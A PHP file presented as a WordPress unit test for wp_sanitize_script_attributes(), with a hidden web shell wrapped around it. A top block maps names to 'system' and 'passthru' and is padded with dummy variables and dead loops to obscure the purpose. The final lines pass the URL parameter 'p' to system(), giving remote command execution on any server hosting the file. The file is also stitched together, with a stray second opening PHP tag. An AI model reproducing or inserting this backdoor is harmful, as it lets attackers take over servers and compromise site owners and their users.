<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * Test wp_sanitize_script_attributes().
 *
 * @group dependencies
 * @group scripts
 * @covers ::wp_sanitize_script_attributes
 */
class Tests_Functions_wpSanitizeScriptAttributes extends WP_UnitTestCase {

	public function test_sanitize_script_attributes_type_set() {
		add_theme_support( 'html5', array( 'script' ) );

		$this->assertSame(
			' type="application/javascript" src="https://DOMAIN.TLD/PATH/FILE.js" nomodule',
			wp_sanitize_script_attributes(
				array(
					'type'     => 'application/javascript',
					'src'      => 'https://DOMAIN.TLD/PATH/FILE.js',
					'async'    => false,
					'nomodule' => true,
				)
			)
		);

		remove_theme_support( 'html5' );

		$this->assertSame(
			' src="https://DOMAIN.TLD/PATH/FILE.js" type="application/javascript" nomodule="nomodule"',
			wp_sanitize_script_attributes(
				array(
					'src'      => 'https://DOMAIN.TLD/PATH/FILE.js',
					'type'     => 'application/javascript',
					'async'    => false,
					'nomodule' => true,
				)
			)
		);
	}

	public function test_sanitize_script_attributes_type_not_set() {
		add_theme_support( 'html5', array( 'script' ) );

		$this->assertSame(
			' src="https://DOMAIN.TLD/PATH/FILE.js" nomodule',
			wp_sanitize_script_attributes(
				array(
					'src'      => 'https://DOMAIN.TLD/PATH/FILE.js',
					'async'    => false,
					'nomodule' => true,
				)
			)
		);

		remove_theme_support( 'html5' );

		$this->assertSame(
			' src="https://DOMAIN.TLD/PATH/FILE.js" nomodule="nomodule"',
			wp_sanitize_script_attributes(
				array(
					'src'      => 'https://DOMAIN.TLD/PATH/FILE.js',
					'async'    => false,
					'nomodule' => true,
				)
			)
		);
	}


	public function test_sanitize_script_attributes_no_attributes() {
		add_theme_support( 'html5', array( 'script' ) );

		$this->assertSame(
			'',
			wp_sanitize_script_attributes( array() )
		);

		remove_theme_support( 'html5' );
	}

	public function test_sanitize_script_attributes_relative_src() {
		add_theme_support( 'html5', array( 'script' ) );

		$this->assertSame(
			' src="PATH/FILE.js" nomodule',
			wp_sanitize_script_attributes(
				array(
					'src'      => 'PATH/FILE.js',
					'async'    => false,
					'nomodule' => true,
				)
			)
		);

		remove_theme_support( 'html5' );
	}


	public function test_sanitize_script_attributes_only_false_boolean_attributes() {
		add_theme_support( 'html5', array( 'script' ) );

		$this->assertSame(
			'',
			wp_sanitize_script_attributes(
				array(
					'async'    => false,
					'nomodule' => false,
				)
			)
		);

		remove_theme_support( 'html5' );
	}

	public function test_sanitize_script_attributes_only_true_boolean_attributes() {
		add_theme_support( 'html5', array( 'script' ) );

		$this->assertSame(
			' async nomodule',
			wp_sanitize_script_attributes(
				array(
					'async'    => true,
					'nomodule' => true,
				)
			)
		);

		remove_theme_support( 'html5' );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>